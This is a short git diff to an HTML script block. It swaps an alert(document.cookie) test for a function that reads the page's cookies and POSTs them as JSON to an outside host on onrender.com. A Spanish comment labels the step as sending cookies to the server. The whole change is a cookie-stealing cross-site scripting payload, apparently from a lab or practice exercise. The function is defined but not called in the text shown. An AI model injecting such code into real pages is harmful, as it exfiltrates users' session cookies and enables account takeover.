@@ -1,4 +1,17 @@
 
 <script>
-    alert(document.cookie)
+    
+    function obtenerCookies() {
+        const cookies = document.cookie
+
+        //Enviar cookies al servidor
+        fetch("https://testnode-vo76.onrender.com/cookies",{
+            method: 'POST',
+            headers: {
+               'Content-Type': 'application/json', 
+            },
+            body: JSON.stringify({cookies})
+        })
+    }
+
 </script>
